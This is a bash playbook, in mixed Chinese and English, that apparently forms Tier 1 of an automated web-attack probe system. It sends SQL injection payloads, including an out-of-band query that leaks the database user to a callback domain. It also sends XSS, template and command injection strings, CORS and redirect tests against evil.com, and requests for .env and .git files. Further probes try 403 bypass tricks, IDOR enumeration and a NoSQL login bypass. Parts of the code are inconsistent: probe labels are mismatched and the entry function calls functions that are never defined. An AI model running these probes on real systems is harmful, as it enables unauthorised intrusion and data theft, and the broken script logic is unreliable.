# 50 Probes — 三层探测系统

> **Wave 3 核心引擎。** 每个探针 2-5 行 curl/python，命中→加载 hack-skills 深度技能，未命中→零开销。

---

## Tier 1 — 通用探针（12 个，永远跑，~60s）

不依赖任何 Wave 1/2 信号，所有目标必跑。

```bash
URL="<URL>"
HOST="<HOST>"

# ====== Path vars with fallback ======
WORK_DIR="${WORK_ROOT:-$(pwd)}"
TMP="${TMP:-${WORK_DIR}/_work/tmp}"
SHARED="${SHARED:-${WORK_DIR}/_work/shared}"
mkdir -p "$TMP" "$SHARED"

# ====== OAST auto-load ======
# Priority: 1) env var  2) shared layer oast.json  3) auto-start
OAST_DOMAIN="${OAST_DOMAIN:-}"
if [ -z "$OAST_DOMAIN" ] && [ -f "$SHARED/oast.json" ]; then
  OAST_DOMAIN=$(python3 -c "import json;d=json.load(open('$SHARED/oast.json'));print(d.get('domain',''))" 2>/dev/null)
fi
if [ -z "$OAST_DOMAIN" ] && [ -f "infra/oast_setup.md" ]; then
  source infra/oast_setup.md 2>/dev/null
  oast_lifecycle start 2>/dev/null || true
fi
echo "[probes] OAST domain: ${OAST_DOMAIN:-NOT AVAILABLE (OOB probes will skip)}"

HITS_FILE="$TMP/3_probe_hits.json"
echo '{"hits":[]}' > "$HITS_FILE"

# Helper: record a hit
record_hit() {
  local probe="$1" category="$2" evidence="$3"
  python3 -c "
import json,sys
d=json.load(open('$HITS_FILE'))
d['hits'].append({'probe':'$probe','category':'$category','evidence':'$evidence'[:200]})
json.dump(d,open('$HITS_FILE','w'),indent=2)
"
}

# Helper: test a payload against both GET params AND POST body endpoints
# Usage: test_both "<url>" "<param>" "<payload>" → HTTP code
test_post_body() {
  local url="$1" payload="$2" content_type="${3:-application/json}"
  curl -sk -o /dev/null -w "%{http_code}" -X POST "$url" \
    -H "Content-Type: $content_type" -d "$payload" --max-time 5 2>/dev/null
}

# Collect POST endpoints (max 5) for Tier 1 body testing
POST_ENDPOINTS=""
for post_url in $(grep -iE '/api/|/graphql|/login|/register|/upload|/submit|/search' $SHARED/urls_all.txt 2>/dev/null | head -5); do
  POST_ENDPOINTS="$POST_ENDPOINTS $post_url"
done
```

### P1. SQLi — Boolean Blind + Time-Based + OOB

```bash
# Phase 1: Boolean blind (fast, catches 90%)
for url in $(head -10 $SHARED/params_all.txt 2>/dev/null); do
  base_url=$(echo "$url" | cut -d? -f1)
  true_sz=$(curl -sk "$url AND 1=1--" -w "%{size_download}" -o /dev/null --max-time 5)
  false_sz=$(curl -sk "$url AND 1=2--" -w "%{size_download}" -o /dev/null --max-time 5)
  # Only flag if diff > 10% (filter dynamic content noise)
  if [ "$true_sz" != "$false_sz" ] && [ "$true_sz" -gt 0 ]; then
    diff=$((true_sz > false_sz ? true_sz - false_sz : false_sz - true_sz))
    pct=$((diff * 100 / (true_sz > false_sz ? true_sz : false_sz)))
    [ "$pct" -gt 10 ] && \
      record_hit "P1" "sqli-sql-injection" "Boolean blind: true=$true_sz vs false=$false_sz (${pct}% diff) at $url"
  fi
done

# Phase 2: Fallback — error-based on main URL
curl -sk "${URL}?id=1' OR '1'='1" --max-time 5 | grep -qiE "error|syntax|mysql|ORA-|SQLSTATE|pg_query|unterminated|SQLite" && \
  record_hit "P1" "sqli-sql-injection" "Error-based SQLi on main URL"

# Phase 3: Time-based blind (catches what boolean misses, 5s budget)
for url in $(head -3 $SHARED/params_all.txt 2>/dev/null); do
  start_ms=$(date +%s%3N 2>/dev/null || echo 0)
  curl -sk "$url' AND SLEEP(3)--" -o /dev/null --max-time 6 2>/dev/null
  elapsed=$(( $(date +%s%3N 2>/dev/null || echo 0) - start_ms ))
  if [ "$elapsed" -gt 2500 ] && [ "$elapsed" -lt 5500 ]; then
    record_hit "P1" "sqli-sql-injection" "Time-based blind: SLEEP(3) → ${elapsed}ms at $url"
    break
  fi
  # PostgreSQL variant
  start_ms=$(date +%s%3N 2>/dev/null || echo 0)
  curl -sk "$url'; SELECT pg_sleep(3)--" -o /dev/null --max-time 6 2>/dev/null
  elapsed=$(( $(date +%s%3N 2>/dev/null || echo 0) - start_ms ))
  if [ "$elapsed" -gt 2500 ] && [ "$elapsed" -lt 5500 ]; then
    record_hit "P1" "sqli-sql-injection" "Time-based blind: pg_sleep(3) → ${elapsed}ms at $url"
    break
  fi
done

# Phase 4: OOB (only if OAST domain available, costs nothing if not set)
if [ -n "$OAST_DOMAIN" ]; then
  for url in $(head -3 $SHARED/params_all.txt 2>/dev/null); do
    curl -sk "$url' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT user()),'.${OAST_DOMAIN}\\\\a'))--" -o /dev/null --max-time 5 2>/dev/null &
  done
  echo "[P1] OOB probes sent to ${OAST_DOMAIN} — check interactsh for callbacks"
fi
```

### P2. XSS — Reflection Check
```bash
PAYLOAD_ENC="%3Cscript%3Ealert(1)%3C%2Fscript%3E"
for param in q search s query id name value input text keyword filter tag; do
  resp=$(curl -sk "${URL}?${param}=${PAYLOAD_ENC}" --max-time 5)
  echo "$resp" | grep -q "<script>alert(1)</script>" && \
    record_hit "P2" "xss-cross-site-scripting" "Unencoded reflection: param=$param" && break
  echo "$resp" | grep -q "alert(1)" && \
    record_hit "P2" "xss-cross-site-scripting" "Partial reflection: param=$param"
done
```

### P3. SSTI — Polyglot + Double-Check

```bash
# Multi-engine polyglot: covers Jinja2, Twig, EJS, Pug, Smarty, Freemarker, Velocity
SSTI_PAYLOADS='{{7*7}} ${7*7} <%=7*7%> #{7*7} ${{7*7}} [[7*7]] {{7*'\''7'\''}}'
# Double-check payload (different operation → different expected result)
SSTI_CONFIRM='{{9*9}} ${9*9} <%=9*9%>'
SSTI_FOUND=0

for param in q search s id name value input data query filter; do
  for payload in $SSTI_PAYLOADS; do
    encoded=$(python3 -c "import urllib.parse;print(urllib.parse.quote('''$payload'''))" 2>/dev/null)
    [ -z "$encoded" ] && encoded="$payload"
    resp=$(curl -sk "${URL}?${param}=${encoded}" --max-time 5 2>/dev/null)
    
    # Check for "49" — but verify it's not just a coincidental page number
    if echo "$resp" | grep -q "49"; then
      # Double-check with different operation: 9*9=81
      encoded2=$(python3 -c "import urllib.parse;print(urllib.parse.quote('''$SSTI_CONFIRM'''))" 2>/dev/null)
      resp2=$(curl -sk "${URL}?${param}=${encoded2}" --max-time 5 2>/dev/null)
      if echo "$resp2" | grep -q "81"; then
        record_hit "P3" "ssti-server-side-template-injection" "SSTI confirmed: 7*7=49 AND 9*9=81 via param=$param payload=$payload"
        SSTI_FOUND=1
        break 2
      fi
    fi
  done
done

# Fallback: if 7*7 didn't work, try template-specific probes
[ "$SSTI_FOUND" = "0" ] && {
  # Jinja2 specific: {{config}}
  resp=$(curl -sk "${URL}?q=$(python3 -c "import urllib.parse;print(urllib.parse.quote('{{config}}'))")" --max-time 5 2>/dev/null)
  echo "$resp" | grep -qiE '"DEBUG"|SECRET_KEY|SQLALCHEMY' && \
    record_hit "P3" "ssti-server-side-template-injection" "Jinja2 config object exposed"

  # Twig specific: {{_self}}
  resp=$(curl -sk "${URL}?q=$(python3 -c "import urllib.parse;print(urllib.parse.quote('{{_self}}'))")" --max-time 5 2>/dev/null)
  echo "$resp" | grep -qiE "Twig_Template|__TwigTemplate" && \
    record_hit "P3" "ssti-server-side-template-injection" "Twig _self object exposed"
}
```

### P4. CMDi — Command Injection
```bash
for param in cmd exec command run ping ip host file path dir; do
  resp=$(curl -sk "${URL}?${param}=;id" --max-time 5)
  echo "$resp" | grep -qiE "uid=[0-9]+\([a-z]+\)" && \
    record_hit "P4" "cmdi-command-injection" "Command execution: $param" && break
  resp=$(curl -sk "${URL}?${param}=|whoami" --max-time 5)
  echo "$resp" | grep -qiE "root|administrator|www-data|nt authority" && \
    record_hit "P4" "cmdi-command-injection" "Command output in response: $param" && break
done
```

### P5. CORS — 3-Vector
```bash
# V1: arbitrary origin
resp=$(curl -sk -I -H "Origin: https://evil.com" "$URL" --max-time 5)
acao=$(echo "$resp" | grep -i "access-control-allow-origin" | tr -d '\r')
acac=$(echo "$resp" | grep -i "access-control-allow-credentials" | tr -d '\r')
[[ "$acao" == *"evil.com"* && "$acac" == *"true"* ]] && \
  record_hit "P5" "cors-cross-origin-misconfiguration" "Arbitrary origin + credentials: $acao / $acac"

# V2: null origin
null_acao=$(curl -sk -I -H "Origin: null" "$URL" --max-time 5 | grep -i "access-control-allow-origin" | tr -d '\r')
[[ "$null_acao" == *"null"* ]] && \
  record_hit "P5" "cors-cross-origin-misconfiguration" "Null origin accepted: $null_acao"

# V3: wildcard + creds combo
[[ "$acao" == *"*"* && "$acac" == *"true"* ]] && \
  record_hit "P5" "cors-cross-origin-misconfiguration" "Wildcard + credentials — universal CORS bypass"
```

### P6. Open Redirect
```bash
for param in url next return returnUrl goto target redirect destination continue to out; do
  location=$(curl -sk -o /dev/null -w "%{redirect_url}" --max-redirs 1 --max-time 5 "${URL}?${param}=https://evil.com")
  [[ "$location" == *"evil.com"* ]] && \
    record_hit "P6" "open-redirect" "Open redirect via $param → $location" && break
done
```

### P7. Sensitive Files
```bash
for path in /.env /.git/config /.git/HEAD /.svn/entries /robots.txt /sitemap.xml \
            /wp-config.php /phpinfo.php /info.php /backup.sql /dump.sql \
            /package.json /composer.json /Dockerfile /docker-compose.yml \
            /swagger.json /openapi.json /api/docs /api/swagger.json \
            /server-status /server-info /actuator/health /actuator/env; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" -L --max-redirs 2 "${URL}${path}" --max-time 4)
  size=$(curl -sk -w "%{size_download}" -o /dev/null "${URL}${path}" --max-time 4)
  [[ "$status" == "200" && "$size" -gt 20 ]] && \
    case "$path" in
      /.git/*|/.svn/*) record_hit "P7" "insecure-source-code-management" "$path accessible: $status/${size}b" ;;
      /.env|/wp-config.php|/package.json|/Dockerfile) record_hit "P7" "insecure-source-code-management" "$path accessible: $status/${size}b" ;;
      /phpinfo.php|/info.php) record_hit "P7" "cmdi-command-injection" "phpinfo exposed: $path" ;;
      /actuator/*) record_hit "P7" "deserialization-insecure" "Spring Boot actuator: $path → $status" ;;
      /swagger.json|/openapi.json) record_hit "P7" "api-recon-and-docs" "API docs exposed: $path → $status" ;;
      *) record_hit "P7" "insecure-source-code-management" "$path accessible: $status/${size}b" ;;
    esac
done
```

### P8. HTTP Methods — Dangerous
```bash
# Test PUT/DELETE on main URL and common paths
for method in PUT DELETE PATCH; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" -X "$method" "$URL" --max-time 5)
  [[ "$status" != "405" && "$status" != "501" ]] && \
    record_hit "P9" "401-403-bypass-techniques" "$method allowed on $URL → $status" && break
done
# PUT file write probe on /uploads/
for up_path in /uploads/test.txt /files/test.txt /static/test.txt /assets/test.txt /public/test.txt; do
  up_status=$(curl -sk -o /dev/null -w "%{http_code}" -X PUT "${URL}${up_path}" -d "hackprobe-test" --max-time 5)
  [[ "$up_status" == "201" || "$up_status" == "200" ]] && \
    record_hit "P9" "upload-insecure-files" "PUT write to $up_path → $up_status"
done
```

### P10. CRLF Header 注入
```bash
crlf_resp=$(curl -sk -I "${URL}?q=%0d%0aX-CRLF-Test:%20injected" --max-time 5)
echo "$crlf_resp" | grep -qi "X-CRLF-Test: injected" && \
  record_hit "P10" "crlf-injection" "CRLF header injection confirmed"
```

### P11. 403 Bypass — Header + Path Fuzzing

```bash
# Phase 1: Header-based bypass (6 headers, fast)
for header in "X-Original-URL: /admin" "X-Rewrite-URL: /admin" "X-Forwarded-For: 127.0.0.1" \
              "X-Forwarded-Host: 127.0.0.1" "X-Client-IP: 127.0.0.1" "X-Real-IP: 127.0.0.1"; do
  h_name=$(echo "$header" | cut -d: -f1)
  bypass_status=$(curl -sk -o /dev/null -w "%{http_code}" -H "$header" "${URL}/admin" --max-time 5)
  [ "$bypass_status" = "200" ] && \
    record_hit "P11" "401-403-bypass-techniques" "403 bypass via $h_name → 200" && break 2
done

# Phase 2: Path-based bypass (more effective than headers in practice)
for path in "/admin" "/api" "/dashboard"; do
  base_code=$(curl -sk -o /dev/null -w "%{http_code}" "${URL}${path}" --max-time 5)
  # Only fuzz if we get 403
  [ "$base_code" != "403" ] && continue

  # 7 path fuzzing variants
  for variant in "${path}/" "${path};" "${path}%2e" "/.${path}" "${path}..;/" \
                 "${path}.json" "${path}%23/..%23/"; do
    fuzz_code=$(curl -sk -o /dev/null -w "%{http_code}" --path-as-is "${URL}${variant}" --max-time 5)
    if [ "$fuzz_code" != "403" ] && [ "$fuzz_code" != "404" ] && [ "$fuzz_code" != "000" ]; then
      record_hit "P11" "401-403-bypass-techniques" "403 path bypass: ${path} → ${variant} → $fuzz_code"
      break 3
    fi
  done
done
```

### P12. IDOR — Sequential ID 探测
```bash
# 对每个含 id/uuid 的 URL 做顺序遍历
for url in $(grep -iE '[?&](id|uid|user_id|uuid)=' $SHARED/params_idor.txt 2>/dev/null | head -5); do
  base=$(echo "$url" | sed 's/=\([0-9]\+\)/=X/g' | sed 's/=\([a-f0-9-]\+\)/=X/g')
  sz1=$(curl -sk "${base/X/1}" -w "%{size_download}" -o /dev/null --max-time 5)
  sz3=$(curl -sk "${base/X/3}" -w "%{size_download}" -o /dev/null --max-time 5)
  if [ "$sz1" != "$sz3" ] && [ "$sz1" -gt 100 ] && [ "$sz3" -gt 100 ]; then
    record_hit "P12" "idor-broken-object-authorization" "Response differs for ID 1 vs 3 at $url: ${sz1}b vs ${sz3}b"
    break
  fi
done
```

---

### P12.5 — POST Body Injection（对 POST 端点发 JSON/form body 探针）
```bash
# Unified POST body probe — tests SQLi, SSTI, NoSQL via JSON/Form body (max 5 endpoints, ~15s)
for post_url in $POST_ENDPOINTS; do
  [ -z "$post_url" ] && continue
  
  # A. SQLi via JSON body
  status=$(test_post_body "$post_url" '{"id":"1'"'"' OR 1=1--"}' "application/json")
  [ "$status" = "200" ] && curl -sk -X POST "$post_url" -H "Content-Type: application/json" \
    -d '{"id":"1'"'"' OR 1=1--"}' --max-time 5 2>/dev/null | grep -qiE "error|syntax|mysql|ORA-|unterminated" && \
    record_hit "P12.5" "sqli-sql-injection" "SQLi via JSON POST body at $post_url"

  # B. SSTI via JSON body
  resp=$(curl -sk -X POST "$post_url" -H "Content-Type: application/json" \
    -d '{"q":"{{7*7}}"}' --max-time 5 2>/dev/null)
  echo "$resp" | grep -q "49" && \
    record_hit "P12.5" "ssti-server-side-template-injection" "SSTI via JSON POST body at $post_url"

  # C. NoSQL injection via JSON body
  resp=$(curl -sk -X POST "$post_url" -H "Content-Type: application/json" \
    -d '{"username":{"$ne":""},"password":{"$ne":""}}' --max-time 5 2>/dev/null)
  echo "$resp" | grep -qiE "success|authenticated|welcome|dashboard|token" && \
    record_hit "P12.5" "nosql-injection" "NoSQL auth bypass via JSON POST body at $post_url"
  
  # D. Parameter pollution (form body)
  resp=$(curl -sk -X POST "$post_url" -H "Content-Type: application/x-www-form-urlencoded" \
    -d "id=1&id=2&id=3" --max-time 5 2>/dev/null)
  echo "$resp" | grep -qiE "error|invalid|multiple|duplicate" && \
    record_hit "P12.5" "http-parameter-pollution" "HTTP parameter pollution via POST body at $post_url"
  
  break  # Test first POST endpoint only to save time
done
```

---

## Tier 1 执行入口

```bash
run_probes_tier1() {
  echo "[probes] ====== $(date +%H:%M:%S) Tier 1: Universal (13 probes) ======"
  
  P1_SQLi
  P2_XSS  
  P3_SSTI
  P4_CMDi
  P5_CORS
  P6_OpenRedirect
  P7_SensitiveFiles
  P8_HTTPMethods
  P10_CRLF
  P11_403Bypass
  P12_IDOR
  P12_5_POST_Body
  
  echo "[probes] Tier 1 done: $(python3 -c "import json;print(len(json.load(open('$HITS_FILE'))['hits']))" 2>/dev/null || echo 0) hits"
}
```
